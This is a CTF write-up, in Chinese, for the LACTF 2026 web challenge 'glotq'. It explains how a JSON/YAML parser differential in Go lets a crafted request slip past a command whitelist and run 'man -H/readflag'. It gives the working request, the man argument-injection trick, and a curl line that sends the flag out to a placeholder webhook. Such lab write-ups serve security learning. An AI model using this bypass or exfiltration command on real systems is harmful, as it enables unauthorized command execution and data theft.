# Writeup — glotq (LACTF 2026, web/medium)

## 架構：驗證與執行用不同解析器

`middleware.go` 的 `SecurityMiddleware` **依 Content-Type header** 選解析器，讀出 `command`/`args` 做白名單：

```go
switch {
case strings.Contains(contentType, "application/json"): json.Unmarshal(body, &JSONPayload{...})
case strings.Contains(contentType, "...yaml"):           yaml.Unmarshal(body, &YAMLPayload{...})
case strings.Contains(contentType, "...xml"):            xml.Unmarshal(body, &XMLPayload{...})
}
// endpointCommands["/yaml"] = {yq:true, man:true}
if command == "man" {
    if len(args) != 1 { 403 }                       // 恰一個參數
    if !{jq,yq,xq}[args[0]] { 403 }                 // 且必須是 jq/yq/xq
}
```

`handlers.go` 的 handler 卻**依端點**用固定解析器重新解析同一份 body：`/json`→`json.Unmarshal`、`/yaml`→`yaml.Unmarshal`、`/xml`→`xml.Unmarshal`，然後 `executeCommand(payload.Command, payload.Args, body)` 真正 `exec.Command`。

關鍵：對 `/yaml` 端點，我送 **`Content-Type: application/json`**。於是：

- **middleware** 依 header 走 JSON 分支 → 用 `encoding/json` 解析。
- **YAMLHandler** 依端點走 YAML 分支 → 用 `yaml.v3` 解析**同一份 body**。

只要這份 body 是「JSON 與 YAML 都合法、但兩者讀出不同 `args`」的多義文件，就能過檢查、卻執行注入版本。

## Go 解析器的坑：欄位大小寫

`encoding/json` 對 key **大小寫不敏感**，且同一欄位出現多個 key 時**後者覆蓋**；`yaml.v3` 則**大小寫敏感**、只認 tag 指定的小寫 `args`。利用這個差異：

```
POST /yaml
Content-Type: application/json

{"command":"man","args":["-H/readflag","jq"],"Args":["jq"]}
```

- **middleware（JSON）**：`JSONPayload.Args` 有 `json:"args"`。JSON 物件裡 `args` 與 `Args` 都對映到同一個 `Args` 欄位，後出現的 `"Args":["jq"]` 覆蓋前者 → middleware 看到 `command=man, args=["jq"]`，長度 1 且是 `jq` → **通過白名單**。
- **YAMLHandler（YAML）**：`YAMLPayload.Args` 有 `yaml:"args"`，大小寫敏感，只讀 `args`，忽略 `Args` → executor 看到 `args=["-H/readflag","jq"]` → 執行 `man -H/readflag jq`。

（此為 Trail of Bits「Unexpected security footguns in Go's parsers」所述類型：同一 body 被兩個解析器讀成不同結果。`/xml` 端點也可用 JSON–XML polyglot 達成相同效果。）

## `man` 參數注入 → 執行 /readflag

`man -H<cmd>`（即 `--html=<cmd>`）會把 `<cmd>` 當作 render HTML 用的瀏覽器來執行。這裡 `-H/readflag` 讓 `man` 在渲染 `jq` manpage 時執行 `/readflag`：

```c
// readflag.c（服務端 setuid root, chmod 4755）
int main(){ FILE*fp=fopen("/flag.txt","r"); ... printf 出內容; }
```

`/readflag` 印出 `/flag.txt`。`executeCommand` 用 `cmd.CombinedOutput()` 收集輸出並回傳，flag 出現在回應中。若環境未把瀏覽器 stdout 回傳，也可改成外帶：

```
--html=FLAG=$(/readflag); curl -X POST <webhook> -d flag=$FLAG
```

## 最短打法

```
POST /yaml   Content-Type: application/json
{"command":"man","args":["-H/readflag","jq"],"Args":["jq"]}
```

回應中即含 `/readflag` 印出的 flag。

## Flag

`lactf{PoLY9LOt_TH3_Fl49}`
